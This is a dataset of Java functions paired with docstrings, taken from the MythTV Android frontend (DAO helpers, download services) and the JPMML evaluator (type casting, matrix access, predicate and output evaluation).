{"docstring": "/* (non-Javadoc)\n * @see org.mythtv.db.dvr.ProgramDaoHelper#findAll()\n */\n", "func_signal": "@Override\npublic List<Program> findAll( final Context context, final LocationProfile locationProfile )", "code": "{\n//\t\tLog.d( TAG, \"findAll : enter\" );\n\n\tif( null == context ) {\n\t\tthrow new IllegalArgumentException( \"Context is required\" );\n\t}\n\t\n\tif( null == locationProfile ) {\n\t\tthrow new IllegalArgumentException( \"LocationProfile is required\" );\n\t}\n\t\n\tString selection = appendLocationHostname( context, locationProfile, \"\", ProgramConstants.TABLE_NAME_RECORDED );\n//\t\tLog.d( TAG, \"findAll : selection=\" + selection );\n\t\n\tList<Program> programs = findAll( context, ProgramConstants.CONTENT_URI_RECORDED, null, selection, null, ProgramConstants.FIELD_END_TIME + \" DESC\", ProgramConstants.TABLE_NAME_RECORDED );\n\t\n//\t\tLog.d( TAG, \"findAll : exit\" );\n\treturn programs;\n}", "path": "src\\org\\mythtv\\db\\dvr\\RecordedDaoHelper.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "// internal helpers\n", "func_signal": "private String downloadSetting( final LocationProfile locationProfile, final String settingName, String settingDefault ) throws MythServiceApiRuntimeException", "code": "{\n\tLog.v( TAG, \"downloadSetting : enter\" );\n\n\tString setting = null;\n\n\tResponseEntity<org.mythtv.services.api.v027.beans.SettingList> responseEntity = mMythServicesTemplate.mythOperations().getSetting( locationProfile.getHostname(), settingName, settingDefault,  ETagInfo.createEmptyETag() );\n\n\tif( responseEntity.getStatusCode().equals( HttpStatus.OK ) ) {\n\n\t\torg.mythtv.services.api.v027.beans.SettingList settingList = responseEntity.getBody();\n\n\t\tif( null != settingList ) {\n\t\t\t\n\t\t\tif( null != settingList.getSettings() && !settingList.getSettings().isEmpty() ) {\n\t\t\t\t\n\t\t\t\tif( settingList.getSettings().containsKey( settingName ) ) {\n\t\t\t\t\tsetting = settingList.getSettings().get( settingName );\n\t\t\t\t}\n\t\t\t\t\t\n\t\t\t}\n\t\t\t\n\t\t}\n\n\t}\n\n\tLog.v( TAG, \"downloadSetting : exit\" );\n\treturn setting;\n}", "path": "src\\org\\mythtv\\service\\myth\\v27\\SettingHelperV27.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "// internal helpers\n", "func_signal": "private Status downloadStatus( final LocationProfile locationProfile, final String url ) throws RemoteException, OperationApplicationException", "code": "{\n\tLog.v( TAG, \"downloadHosts : enter\" );\n\n\tStatus status = null;\n\n\tResponseEntity<org.mythtv.services.api.v025.beans.FrontendStatus> responseEntity = mMythServicesTemplate.frontendOperations().getStatus( ETagInfo.createEmptyETag() );\n\n\tif( responseEntity.getStatusCode().equals( HttpStatus.OK ) ) {\n\n\t\torg.mythtv.services.api.v025.beans.FrontendStatus versionStatus = responseEntity.getBody();\n\n\t\tif( null != versionStatus ) {\n\t\t\tstatus = load( versionStatus );\t\n\t\t}\n\n\t}\n\n\tLog.v( TAG, \"downloadHosts : exit\" );\n\treturn status;\n}", "path": "src\\org\\mythtv\\service\\frontends\\v25\\StatusHelperV25.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see org.mythtv.db.dvr.ProgramDaoHelper#save(org.mythtv.services.api.dvr.Program)\n */\n", "func_signal": "@Override\npublic int save( final Context context, final LocationProfile locationProfile, Program program )", "code": "{\n//\t\tLog.d( TAG, \"save : enter\" );\n\n\tif( null == context ) {\n\t\tthrow new IllegalArgumentException( \"Context is required\" );\n\t}\n\t\n\tif( null == locationProfile ) {\n\t\tthrow new IllegalArgumentException( \"LocationProfile is required\" );\n\t}\n\t\n\tint saved = save( context, ProgramConstants.CONTENT_URI_RECORDED, locationProfile, program, ProgramConstants.TABLE_NAME_RECORDED );\n\t\n//\t\tLog.d( TAG, \"save : exit\" );\n\treturn saved;\n}", "path": "src\\org\\mythtv\\db\\dvr\\RecordedDaoHelper.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see android.app.IntentService#onHandleIntent(android.content.Intent)\n */\n", "func_signal": "@Override\nprotected void onHandleIntent( Intent intent )", "code": "{\n\tLog.d( TAG, \"onHandleIntent : enter\" );\n\tsuper.onHandleIntent( intent );\n\t\t\t\n\tBundle extras = intent.getExtras();\n\tlong id = extras.getLong( LocationProfileConstants._ID );\n\tif( id <= 0 ) {\n\t\tIntent completeIntent = new Intent( ACTION_COMPLETE );\n\t\tcompleteIntent.putExtra( EXTRA_COMPLETE, \"No ID passed in\" );\n\t\tcompleteIntent.putExtra( EXTRA_COMPLETE_OFFLINE, Boolean.TRUE );\n\t\tsendBroadcast( completeIntent );\n\n\t\tLog.d( TAG, \"onHandleIntent : exit, No ID passed in\" );\n\t\treturn;\n\t}\n\n\tboolean passed = true;\n\t\n\tif ( intent.getAction().equals( ACTION_DOWNLOAD ) ) {\n    \t\tLog.i( TAG, \"onHandleIntent : DOWNLOAD action selected\" );\n\n\t\tPowerManager mgr = (PowerManager) getSystemService( Context.POWER_SERVICE );\n\t\tWakeLock wakeLock = mgr.newWakeLock( PowerManager.PARTIAL_WAKE_LOCK, \"PreferenceServiceDownload\" );\n\n\t\tLocationProfile profile = mLocationProfileDaoHelper.findOne( this, id );\n    \t\tif( null == profile ) {\n    \t\t\tIntent completeIntent = new Intent( ACTION_COMPLETE );\n    \t\t\tcompleteIntent.putExtra( EXTRA_COMPLETE, \"Location Profile not found\" );\n    \t\t\tcompleteIntent.putExtra( EXTRA_COMPLETE_OFFLINE, Boolean.TRUE );\n    \t\t\tsendBroadcast( completeIntent );\n\n    \t\t\tLog.d( TAG, \"onHandleIntent : exit, Location Profile not found\" );\n    \t\t\treturn;\n    \t\t}\n    \t\t\n    \t\tif( !NetworkHelper.getInstance().isMasterBackendConnected( this, profile ) ) {\n    \t\t\tIntent completeIntent = new Intent( ACTION_COMPLETE );\n    \t\t\tcompleteIntent.putExtra( EXTRA_COMPLETE, \"Master Backend not connected\" );\n    \t\t\tcompleteIntent.putExtra( EXTRA_COMPLETE_OFFLINE, Boolean.TRUE );\n    \t\t\tsendBroadcast( completeIntent );\n\n    \t\t\tLog.d( TAG, \"onHandleIntent : exit, Master Backend not connected\" );\n    \t\t\treturn;\n    \t\t}\n    \t\t\n    \t\tBackendStatus status = null;\n    \t\ttry {\n\n    \t\t\tdownload( profile );\n   \t\t\t\t\n   \t\t\t\tLog.v( TAG, \"onHandleIntent : location profile updated\" );\n\n\t\t} catch( Exception e ) {\n\t\t\tLog.e( TAG, \"onHandleIntent : error\", e );\n\t\t\t\n\t\t\tpassed = false;\n\t\t} finally {\n\n    \t\t\tif( wakeLock.isHeld() ) {\n    \t\t\t\twakeLock.release();\n    \t\t\t}\n\t\t\t\n    \t\t\tIntent completeIntent = new Intent( ACTION_COMPLETE );\n    \t\t\tcompleteIntent.putExtra( EXTRA_COMPLETE, \"Preferences Recorded Programs Download Service Finished\" );\n    \t\t\tif( null == status ) {\n    \t\t\t\tcompleteIntent.putExtra( EXTRA_COMPLETE_UPTODATE, passed );\n    \t\t\t}\n    \t\t\t\n    \t\t\tsendBroadcast( completeIntent );\n    \t\t}\n    \t\t\n        }\n\t\n\tLog.d( TAG, \"onHandleIntent : exit\" );\n}", "path": "src\\org\\mythtv\\service\\preferences\\PreferencesRecordedDownloadService.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/* (non-Javadoc)\n * @see android.os.AsyncTask#onPostExecute(java.lang.Object)\n */\n", "func_signal": "@Override\nprotected void onPostExecute( Boolean result )", "code": "{\n\tLog.d( TAG, \"onPostExecute : enter\" );\n\tsuper.onPostExecute( result );\n\n\tLog.d( TAG, \"onPostExecute : result=\" + result );\n\tlistener.onCreateStorageGroupTaskFinished( result );\n\t\n\tLog.d( TAG, \"onPostExecute : exit\" );\n}", "path": "src\\org\\mythtv\\service\\myth\\CreateStorageGroupTask.java", "repo_name": "MythTV-Clients/MythTV-Android-Frontend", "stars": 65, "license": "gpl-3.0", "language": "java", "size": 36045}
{"docstring": "/**\n * Casts the specified value to Integer data type.\n *\n * @see DataType#INTEGER\n */\n", "func_signal": "static\nprivate Integer toInteger(Object value)", "code": "{\n\n\tif(value instanceof Integer){\n\t\treturn (Integer)value;\n\t}\n\n\tthrow new TypeCheckException(DataType.INTEGER, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @return The number of rows.\n */\n", "func_signal": "static\npublic int getRows(Matrix matrix)", "code": "{\n\tInteger nbRows = matrix.getNbRows();\n\tif(nbRows != null){\n\t\treturn nbRows.intValue();\n\t}\n\n\tList<Array> arrays = matrix.getArrays();\n\tList<MatCell> matCells = matrix.getMatCells();\n\n\tMatrix.Kind kind = matrix.getKind();\n\tswitch(kind){\n\t\tcase DIAGONAL:\n\t\t\t{\n\t\t\t\tif(arrays.size() == 1){\n\t\t\t\t\tArray array = arrays.get(0);\n\n\t\t\t\t\treturn ArrayUtil.getSize(array);\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase SYMMETRIC:\n\t\t\t{\n\t\t\t\tif(arrays.size() > 0){\n\t\t\t\t\treturn arrays.size();\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase ANY:\n\t\t\t{\n\t\t\t\tif(arrays.size() > 0){\n\t\t\t\t\treturn arrays.size();\n\t\t\t\t} // End if\n\n\t\t\t\tif(matCells.size() > 0){\n\t\t\t\t\tMatCell matCell = Collections.max(matCells, MatrixUtil.rowComparator);\n\n\t\t\t\t\treturn getRow(matCell);\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tthrow new UnsupportedFeatureException(matrix, kind);\n\t}\n\n\tthrow new InvalidFeatureException(matrix);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\MatrixUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @see DataType#DATE\n */\n", "func_signal": "static\nprivate LocalDate toDate(Object value)", "code": "{\n\n\tif(value instanceof LocalDate){\n\t\treturn (LocalDate)value;\n\t}\n\n\tthrow new TypeCheckException(DataType.DATE, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @return The least restrictive data type of the data types of two values\n */\n", "func_signal": "static\npublic DataType getResultDataType(DataType left, DataType right)", "code": "{\n\n\tif((left).equals(right)){\n\t\treturn left;\n\t}\n\n\t// \"When the input parameters have multiple dataTypes, the least restrictive dataType will be inherited by default.\"\n\tfor(int i = 0; i < inheritanceSequence.length; i++){\n\t\tDataType dataType = inheritanceSequence[i];\n\n\t\tif((dataType).equals(left) || (dataType).equals(right)){\n\t\t\treturn dataType;\n\t\t}\n\t}\n\n\tthrow new EvaluationException();\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @see DataType#DATE_DAYS_SINCE_1960\n * @see DataType#DATE_DAYS_SINCE_1970\n * @see DataType#DATE_DAYS_SINCE_1980\n */\n", "func_signal": "static\nprivate DaysSinceDate toDaysSinceDate(Object value, LocalDate epoch)", "code": "{\n\n\tif(value instanceof DaysSinceDate){\n\t\tDaysSinceDate period = (DaysSinceDate)value;\n\n\t\tif((period.getEpoch()).equals(epoch)){\n\t\t\treturn period;\n\t\t}\n\t}\n\n\tthrow new TypeCheckException(DataType.DATE_DAYS_SINCE_1970, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * Casts the specified value to Double data type.\n *\n * @see DataType#DOUBLE\n */\n", "func_signal": "static\nprivate Double toDouble(Object value)", "code": "{\n\n\tif(value instanceof Double){\n\t\treturn (Double)value;\n\t} else\n\n\tif((value instanceof Float) || (value instanceof Integer)){\n\t\tNumber number = (Number)value;\n\n\t\treturn Double.valueOf(number.doubleValue());\n\t}\n\n\tthrow new TypeCheckException(DataType.DOUBLE, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @param row The row index. The index of the first row is <code>1</code>.\n * @param column The column index. The index of the first column is <code>1</code>.\n *\n * @return The element at the specified location, or <code>null</code>.\n *\n * @throws IndexOutOfBoundsException If either the row or column index is out of range.\n */\n", "func_signal": "static\npublic Number getElementAt(Matrix matrix, int row, int column)", "code": "{\n\tList<Array> arrays = matrix.getArrays();\n\tList<MatCell> matCells = matrix.getMatCells();\n\n\tMatrix.Kind kind = matrix.getKind();\n\tswitch(kind){\n\t\tcase DIAGONAL:\n\t\t\t{\n\t\t\t\t// \"The content is just one Array of numbers representing the diagonal values\"\n\t\t\t\tif(arrays.size() == 1){\n\t\t\t\t\tArray array = arrays.get(0);\n\n\t\t\t\t\tList<? extends Number> elements = ArrayUtil.getNumberContent(array);\n\n\t\t\t\t\t// Diagonal element\n\t\t\t\t\tif(row == column){\n\t\t\t\t\t\treturn elements.get(row - 1);\n\t\t\t\t\t} else\n\n\t\t\t\t\t// Off-diagonal element\n\t\t\t\t\t{\n\t\t\t\t\t\tint min = 1;\n\t\t\t\t\t\tint max = elements.size();\n\n\t\t\t\t\t\tif((row < min || row > max) || (column < min || column > max)){\n\t\t\t\t\t\t\tthrow new IndexOutOfBoundsException();\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\treturn matrix.getOffDiagDefault();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase SYMMETRIC:\n\t\t\t{\n\t\t\t\t// \"The content must be represented by Arrays\"\n\t\t\t\tif(arrays.size() > 0){\n\n\t\t\t\t\t// Make sure the specified coordinates target the lower left triangle\n\t\t\t\t\tif(column > row){\n\t\t\t\t\t\tint temp = row;\n\n\t\t\t\t\t\trow = column;\n\t\t\t\t\t\tcolumn = temp;\n\t\t\t\t\t}\n\n\t\t\t\t\treturn getArrayValue(arrays, row, column);\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase ANY:\n\t\t\t{\n\t\t\t\tif(arrays.size() > 0){\n\t\t\t\t\treturn getArrayValue(arrays, row, column);\n\t\t\t\t} // End if\n\n\t\t\t\tif(matCells.size() > 0){\n\n\t\t\t\t\tif(row < 1 || column < 1){\n\t\t\t\t\t\tthrow new IndexOutOfBoundsException();\n\t\t\t\t\t}\n\n\t\t\t\t\tNumber value = getMatCellValue(matCells, row, column);\n\t\t\t\t\tif(value == null){\n\n\t\t\t\t\t\tif(row == column){\n\t\t\t\t\t\t\treturn matrix.getDiagDefault();\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\treturn matrix.getOffDiagDefault();\n\t\t\t\t\t}\n\n\t\t\t\t\treturn value;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tthrow new UnsupportedFeatureException(matrix, kind);\n\t}\n\n\tthrow new InvalidFeatureException(matrix);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\MatrixUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * Casts the specified value to String data type.\n *\n * @see DataType#STRING\n */\n", "func_signal": "static\nprivate String toString(Object value)", "code": "{\n\n\tif(value instanceof String){\n\t\treturn (String)value;\n\t} else\n\n\tif((value instanceof Double) || (value instanceof Float) || (value instanceof Integer)){\n\t\tNumber number = (Number)value;\n\n\t\treturn number.toString();\n\t}\n\n\tthrow new TypeCheckException(DataType.STRING, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @return The number of columns.\n */\n", "func_signal": "static\npublic int getColumns(Matrix matrix)", "code": "{\n\tInteger nbCols = matrix.getNbCols();\n\tif(nbCols != null){\n\t\treturn nbCols.intValue();\n\t}\n\n\tList<Array> arrays = matrix.getArrays();\n\tList<MatCell> matCells = matrix.getMatCells();\n\n\tMatrix.Kind kind = matrix.getKind();\n\tswitch(kind){\n\t\tcase DIAGONAL:\n\t\t\t{\n\t\t\t\tif(arrays.size() == 1){\n\t\t\t\t\tArray array = arrays.get(0);\n\n\t\t\t\t\treturn ArrayUtil.getSize(array);\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase SYMMETRIC:\n\t\t\t{\n\t\t\t\tif(arrays.size() > 0){\n\t\t\t\t\treturn arrays.size();\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase ANY:\n\t\t\t{\n\t\t\t\tif(arrays.size() > 0){\n\t\t\t\t\tArray array = arrays.get(arrays.size() - 1);\n\n\t\t\t\t\treturn ArrayUtil.getSize(array);\n\t\t\t\t} // End if\n\n\t\t\t\tif(matCells.size() > 0){\n\t\t\t\t\tMatCell matCell = Collections.max(matCells, MatrixUtil.columnComparator);\n\n\t\t\t\t\treturn getColumn(matCell);\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tthrow new UnsupportedFeatureException(matrix, kind);\n\t}\n\n\tthrow new InvalidFeatureException(matrix);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\MatrixUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @return A set of {@link Item#getId() Item identifiers}.\n */\n", "func_signal": "private Set<String> createInput(Collection<?> values, EvaluationContext context)", "code": "{\n\tSet<String> result = Sets.newLinkedHashSet();\n\n\tMap<String, String> valueItems = (getItemValues().inverse());\n\n\tvalues:\n\tfor(Object value : values){\n\t\tString stringValue = TypeUtil.format(value);\n\n\t\tString id = valueItems.get(stringValue);\n\t\tif(id == null){\n\t\t\tcontext.addWarning(\"Unknown item value \\\"\" + stringValue + \"\\\"\");\n\n\t\t\tcontinue values;\n\t\t}\n\n\t\tresult.add(id);\n\t}\n\n\treturn result;\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\AssociationModelEvaluator.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @see DataType#TIME_SECONDS\n */\n", "func_signal": "static\nprivate SecondsSinceMidnight toSecondsSinceMidnight(Object value)", "code": "{\n\n\tif(value instanceof SecondsSinceMidnight){\n\t\treturn (SecondsSinceMidnight)value;\n\t}\n\n\tthrow new TypeCheckException(DataType.TIME_SECONDS, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @see DataType#DATE_TIME\n */\n", "func_signal": "static\nprivate LocalDateTime toDateTime(Object value)", "code": "{\n\n\tif(value instanceof LocalDateTime){\n\t\treturn (LocalDateTime)value;\n\t}\n\n\tthrow new TypeCheckException(DataType.DATE_TIME, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * Casts the specified value to Float data type.\n *\n * @see DataType#FLOAT\n */\n", "func_signal": "static\nprivate Float toFloat(Object value)", "code": "{\n\n\tif(value instanceof Float){\n\t\treturn (Float)value;\n\t} else\n\n\tif(value instanceof Integer){\n\t\tNumber number = (Number)value;\n\n\t\treturn Float.valueOf(number.floatValue());\n\t}\n\n\tthrow new TypeCheckException(DataType.FLOAT, value);\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @return The {@link Boolean} value of the predicate, or <code>null</code> if the value is unknown\n */\n", "func_signal": "static\npublic Boolean evaluate(Predicate predicate, EvaluationContext context)", "code": "{\n\n\tif(predicate instanceof SimplePredicate){\n\t\treturn evaluateSimplePredicate((SimplePredicate)predicate, context);\n\t} else\n\n\tif(predicate instanceof CompoundPredicate){\n\t\treturn evaluateCompoundPredicate((CompoundPredicate)predicate, context);\n\t} else\n\n\tif(predicate instanceof SimpleSetPredicate){\n\t\treturn evaluateSimpleSetPredicate((SimpleSetPredicate)predicate, context);\n\t} else\n\n\tif(predicate instanceof True){\n\t\treturn evaluateTrue((True)predicate);\n\t} else\n\n\tif(predicate instanceof False){\n\t\treturn evaluateFalse((False)predicate);\n\t} else\n\n\t{\n\t\tthrow new UnsupportedFeatureException(predicate);\n\t}\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\PredicateUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * @return The data type of the value.\n */\n", "func_signal": "static\npublic DataType getDataType(Object value)", "code": "{\n\n\tif(value instanceof String){\n\t\treturn DataType.STRING;\n\t} else\n\n\tif(value instanceof Integer){\n\t\treturn DataType.INTEGER;\n\t} else\n\n\tif(value instanceof Float){\n\t\treturn DataType.FLOAT;\n\t} else\n\n\tif(value instanceof Double){\n\t\treturn DataType.DOUBLE;\n\t} else\n\n\tif(value instanceof Boolean){\n\t\treturn DataType.BOOLEAN;\n\t} else\n\n\tif(value instanceof LocalDate){\n\t\treturn DataType.DATE;\n\t} else\n\n\tif(value instanceof LocalTime){\n\t\treturn DataType.TIME;\n\t} else\n\n\tif(value instanceof LocalDateTime){\n\t\treturn DataType.DATE_TIME;\n\t} else\n\n\tif(value instanceof DaysSinceDate){\n\t\tDaysSinceDate period = (DaysSinceDate)value;\n\n\t\tLocalDate epoch = period.getEpoch();\n\n\t\tif((epoch).equals(YEAR_1960)){\n\t\t\treturn DataType.DATE_DAYS_SINCE_1960;\n\t\t} else\n\n\t\tif((epoch).equals(YEAR_1970)){\n\t\t\treturn DataType.DATE_DAYS_SINCE_1970;\n\t\t} else\n\n\t\tif((epoch).equals(YEAR_1980)){\n\t\t\treturn DataType.DATE_DAYS_SINCE_1980;\n\t\t}\n\t} else\n\n\tif(value instanceof SecondsSinceMidnight){\n\t\treturn DataType.TIME_SECONDS;\n\t} else\n\n\tif(value instanceof SecondsSinceDate){\n\t\tSecondsSinceDate period = (SecondsSinceDate)value;\n\n\t\tLocalDate epoch = period.getEpoch();\n\n\t\tif((epoch).equals(YEAR_1960)){\n\t\t\treturn DataType.DATE_TIME_SECONDS_SINCE_1960;\n\t\t} else\n\n\t\tif((epoch).equals(YEAR_1970)){\n\t\t\treturn DataType.DATE_TIME_SECONDS_SINCE_1970;\n\t\t} else\n\n\t\tif((epoch).equals(YEAR_1980)){\n\t\t\treturn DataType.DATE_TIME_SECONDS_SINCE_1980;\n\t\t}\n\t}\n\n\tthrow new EvaluationException();\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\TypeUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
{"docstring": "/**\n * Evaluates the {@link Output} element.\n *\n * @param predictions Map of {@link Evaluator#getPredictedFields() predicted field} values.\n *\n * @return Map of {@link Evaluator#getPredictedFields() predicted field} values together with {@link Evaluator#getOutputFields() output field} values.\n */\n", "func_signal": "static\npublic Map<FieldName, Object> evaluate(Map<FieldName, ?> predictions, ModelEvaluationContext context)", "code": "{\n\tModelManager<?> modelManager = context.getModelManager();\n\n\tOutput output = modelManager.getOrCreateOutput();\n\n\tMap<FieldName, Object> result = Maps.newLinkedHashMap(predictions);\n\n\tList<OutputField> outputFields = output.getOutputFields();\n\tfor(OutputField outputField : outputFields){\n\t\tFieldName targetField = outputField.getTargetField();\n\t\tif(targetField == null){\n\t\t\ttargetField = modelManager.getTargetField();\n\t\t}\n\n\t\tObject value = null;\n\n\t\tResultFeatureType resultFeature = outputField.getFeature();\n\n\t\t// \"If the attribute feature is not specified then the output value is a copy of the target field value.\"\n\t\tif(resultFeature == null){\n\t\t\tresultFeature = ResultFeatureType.PREDICTED_VALUE;\n\t\t}\n\n\t\t// Load the mining result\n\t\tswitch(resultFeature){\n\t\t\tcase PREDICTED_VALUE:\n\t\t\tcase PREDICTED_DISPLAY_VALUE:\n\t\t\tcase PROBABILITY:\n\t\t\tcase RESIDUAL:\n\t\t\tcase ENTITY_ID:\n\t\t\tcase CLUSTER_ID:\n\t\t\tcase AFFINITY:\n\t\t\tcase ENTITY_AFFINITY:\n\t\t\tcase CLUSTER_AFFINITY:\n\t\t\tcase REASON_CODE:\n\t\t\tcase RULE_VALUE:\n\t\t\t\t{\n\t\t\t\t\tif(!predictions.containsKey(targetField)){\n\t\t\t\t\t\tthrow new MissingFieldException(targetField, outputField);\n\t\t\t\t\t}\n\n\t\t\t\t\t// Prediction results could be either simple or complex values\n\t\t\t\t\tvalue = predictions.get(targetField);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t} // End switch\n\n\t\t// Perform the requested computation on the mining result\n\t\tswitch(resultFeature){\n\t\t\tcase PREDICTED_VALUE:\n\t\t\t\t{\n\t\t\t\t\tvalue = getPredictedValue(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase PREDICTED_DISPLAY_VALUE:\n\t\t\t\t{\n\t\t\t\t\tTarget target = modelManager.getTarget(targetField);\n\n\t\t\t\t\tvalue = getPredictedDisplayValue(value, target);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase TRANSFORMED_VALUE:\n\t\t\tcase DECISION:\n\t\t\t\t{\n\t\t\t\t\tExpression expression = outputField.getExpression();\n\t\t\t\t\tif(expression == null){\n\t\t\t\t\t\tthrow new InvalidFeatureException(outputField);\n\t\t\t\t\t}\n\n\t\t\t\t\tvalue = FieldValueUtil.getValue(ExpressionUtil.evaluate(expression, context));\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase PROBABILITY:\n\t\t\t\t{\n\t\t\t\t\tvalue = getProbability(value, outputField);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase RESIDUAL:\n\t\t\t\t{\n\t\t\t\t\tFieldValue expectedValue = context.getField(targetField);\n\t\t\t\t\tif(expectedValue == null){\n\t\t\t\t\t\tthrow new MissingFieldException(targetField, outputField);\n\t\t\t\t\t}\n\n\t\t\t\t\tDataField dataField = modelManager.getDataField(targetField);\n\n\t\t\t\t\tOpType opType = dataField.getOptype();\n\t\t\t\t\tswitch(opType){\n\t\t\t\t\t\tcase CONTINUOUS:\n\t\t\t\t\t\t\tvalue = getContinuousResidual(value, expectedValue);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase CATEGORICAL:\n\t\t\t\t\t\t\tvalue = getCategoricalResidual(value, expectedValue);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\tthrow new UnsupportedFeatureException(outputField, opType);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase ENTITY_ID:\n\t\t\t\t{\n\t\t\t\t\tvalue = getEntityId(value, outputField);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase CLUSTER_ID:\n\t\t\t\t{\n\t\t\t\t\tvalue = getClusterId(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase AFFINITY:\n\t\t\tcase ENTITY_AFFINITY:\n\t\t\t\t{\n\t\t\t\t\tvalue = getAffinity(value, outputField);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase CLUSTER_AFFINITY:\n\t\t\t\t{\n\t\t\t\t\tvalue = getClusterAffinity(value);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase REASON_CODE:\n\t\t\t\t{\n\t\t\t\t\tvalue = getReasonCode(value, outputField);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase RULE_VALUE:\n\t\t\t\t{\n\t\t\t\t\tvalue = getRuleValue(value, outputField);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase WARNING:\n\t\t\t\t{\n\t\t\t\t\tvalue = context.getWarnings();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tthrow new UnsupportedFeatureException(outputField, resultFeature);\n\t\t}\n\n\t\t// The result of one output field becomes available to other other output fields\n\t\tcontext.declare(outputField.getName(), FieldValueUtil.create(outputField, value));\n\n\t\tresult.put(outputField.getName(), value);\n\t}\n\n\treturn result;\n}", "path": "pmml-evaluator\\src\\main\\java\\org\\jpmml\\evaluator\\OutputUtil.java", "repo_name": "jpmml/jpmml", "stars": 81, "license": "other", "language": "java", "size": 3174}
